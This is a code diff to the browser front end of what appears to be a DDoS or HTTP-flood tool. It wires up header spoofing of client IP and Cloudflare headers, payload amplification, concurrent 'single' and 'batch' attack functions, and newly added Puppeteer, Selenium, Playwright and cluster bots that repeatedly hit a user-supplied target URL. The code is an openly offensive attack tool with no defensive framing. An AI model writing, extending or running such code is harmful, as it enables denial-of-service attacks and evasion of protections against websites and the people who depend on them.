@@ -1,4 +1,4 @@
-// DOM Elements
+// ======================== DOM Elements ========================
 const targetUrl = document.getElementById('targetUrl');
 const method = document.getElementById('method');
 const httpVersion = document.getElementById('httpVersion');
@@ -58,13 +58,22 @@ const spoofRealIp = document.getElementById('spoofRealIp');
 const spoofCfConnecting = document.getElementById('spoofCfConnecting');
 const ipPrefixInput = document.getElementById('ipPrefix');
 
+// Bot buttons
+const botPuppeteer = document.getElementById('botPuppeteer');
+const botSelenium = document.getElementById('botSelenium');
+const botPlaywright = document.getElementById('botPlaywright');
+const botCluster = document.getElementById('botCluster');
+const botLoop = document.getElementById('botLoop');
+const botInterval = document.getElementById('botInterval');
+const botHeadless = document.getElementById('botHeadless');
+
 let amplificationEnabled = false;
 let amplificationKB = 500;
 let amplificationTypeSel = 'normal';
 let continuousMode = false;
 let intervalMs = 5000;
 
-// Initializations
+// Initialization events
 if (amplifyToggle) {
   amplifyToggle.addEventListener('change', () => {
     amplificationEnabled = amplifyToggle.checked;
@@ -256,7 +265,7 @@ function buildAdvancedHeaders(targetHost) {
   return headers;
 }
 
-// ======================== SINGLE ATTACK ========================
+// ======================== HTTP/HTTPS Attack (Single) ========================
 async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
   let finalUrl = buildUrlWithQuery(url);
   let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
@@ -334,7 +343,7 @@ async function startSingleAttack() {
   if (!url) { addLog("URL required", true); return; }
   if (!url.startsWith("http")) url = "https://" + url;
   const mtd = method.value;
-  let body = ''; // optional payload
+  let body = '';
   const total = parseInt(totalInput.value);
   const concurrency = parseInt(concurrencyInput.value);
   const timeout = parseInt(timeoutInput.value);
@@ -387,7 +396,7 @@ async function startSingleAttack() {
   }
 }
 
-// ======================== BATCH ATTACK (mirip) ========================
+// ======================== BATCH ATTACK ========================
 async function startBatchAttack() {
   if (isRunning) { addLog("Attack already running!", true); return; }
   let url = targetUrl.value.trim();
@@ -475,7 +484,49 @@ function exportCSV() {
   addLog("CSV exported");
 }
 
-// Health check & active users
+// ======================== Browser Bot Functions ========================
+async function startBot(type) {
+  let url = targetUrl.value.trim();
+  if (!url) { addLog("URL required for bot", true); return; }
+  if (!url.startsWith("http")) url = "https://" + url;
+  const loop = botLoop?.checked || false;
+  const interval = parseInt(botInterval?.value) || 5000;
+  const headless = botHeadless?.checked !== false;
+  let endpoint = '';
+  let body = {};
+  if (type === 'puppeteer') {
+    endpoint = '/api/bot/puppeteer';
+    body = { url, loop, intervalMs: interval, headless };
+  } else if (type === 'selenium') {
+    endpoint = '/api/bot/selenium';
+    body = { url, loop, intervalMs: interval, headless };
+  } else if (type === 'playwright') {
+    endpoint = '/api/bot/playwright';
+    body = { url, loop, intervalMs: interval, headless };
+  } else if (type === 'cluster') {
+    endpoint = '/api/bot/cluster';
+    body = { url, concurrency: 10, totalTasks: 100, loop };
+  }
+  addLog(`🤖 Starting ${type} bot to ${url} (loop: ${loop})`);
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await res.json();
+    addLog(`${type} bot: ${data.message || 'started'}`);
+  } catch(e) {
+    addLog(`Bot error: ${e.message}`, true);
+  }
+}
+
+if (botPuppeteer) botPuppeteer.addEventListener('click', () => startBot('puppeteer'));
+if (botSelenium) botSelenium.addEventListener('click', () => startBot('selenium'));
+if (botPlaywright) botPlaywright.addEventListener('click', () => startBot('playwright'));
+if (botCluster) botCluster.addEventListener('click', () => startBot('cluster'));
+
+// ======================== Health, Heartbeat, Initialization ========================
 async function checkTargetHealth(url) {
   try {
     const start = performance.now();
